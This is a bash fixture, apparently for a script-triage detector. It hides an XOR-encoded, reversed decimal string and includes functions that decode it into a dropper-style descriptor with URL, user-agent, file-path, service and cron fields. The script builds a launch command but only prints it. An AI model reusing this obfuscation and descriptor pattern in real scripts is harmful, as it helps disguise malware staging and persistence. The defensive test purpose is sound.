#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_ca7b8e7f='198,144,151,150,199,199,194,199,147,203,223,151,149,147,134,129,220,221,151,154,145,147,145,223,129,129,151,128,134,156,135,154,221,130,159,134,221,207,154,134,147,130,173,151,158,155,148,142,198,144,151,150,199,199,194,199,147,203,223,156,149,155,147,130,159,147,145,207,150,155,173,156,149,155,147,130,159,147,145,142,195,207,134,156,135,157,145,173,151,149,147,134,129,142,134,130,155,128,145,129,173,154,129,147,144,207,128,151,134,130,147,150,147,142,129,129,151,145,157,128,130,173,154,145,134,147,130,129,155,150,222,158,147,145,157,158,173,151,134,147,145,157,158,207,129,130,151,134,129,142,195,207,132'

readonly Codec_ca7b8e7f='reversed_decimal|single_byte_xor|f2'



Load_ca7b8e7f() {

  item1=()

  local IFS=',' item5

  local -a pieces

  read -r -a pieces <<< "${Material_ca7b8e7f}"

  for ((item5=${#pieces[@]}-1; item5>=0; item5--)); do item1+=("${pieces[item5]}"); done

}



Decode_ca7b8e7f() {

  item2=()

  local item5

  for ((item5=0; item5<${#item1[@]}; item5++)); do

    item2+=("$((item1[item5] ^ 242))")

  done

}



Recover_ca7b8e7f() {

  local -a item1 item2

  local item3 item4 item8 item5

  item4=''

  Load_ca7b8e7f

  local decode_target=Decode_ca7b8e7f; "$decode_target"

  item3=''

  local octal character

  for item5 in "${!item2[@]}"; do

    printf -v octal '%03o' "${item2[item5]}"

    printf -v character '%b' "\\$octal"

    item3+="$character"

  done

  printf '%s\n' "$item3"

}



Inspect_ca7b8e7f() { Recover_ca7b8e7f; }



Plan_ca7b8e7f() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_ca7b8e7f)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a launch_command=(bash "$file_path")

  declare -p launch_command

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_ca7b8e7f; fi

